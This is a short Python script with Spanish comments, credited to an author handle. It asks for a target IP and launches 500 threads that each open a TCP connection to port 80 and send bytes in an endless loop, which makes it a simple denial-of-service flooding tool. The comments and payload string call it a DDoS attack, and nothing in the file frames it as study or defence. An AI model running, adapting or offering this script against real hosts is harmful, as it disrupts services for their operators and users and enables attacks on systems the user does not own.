import socket
import threading

# Solicitar al usuario que ingrese la dirección IP
print("Author= Jona404p")
target = input("Ingresa la IP desesada: ")
port = 80

def attack():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((target, port))
        while True:
            sock.send(b"This is a DDoS attack")  # Se debe enviar en bytes
    except Exception as e:
        print(f"Error en la conexión: {e}")
    finally:
        sock.close()

# Verificar que la IP no esté vacía
if target:
    for _ in range(500):
        t = threading.Thread(target=attack)
        t.start()
else:
    print("No ingresaste una IP válida.")
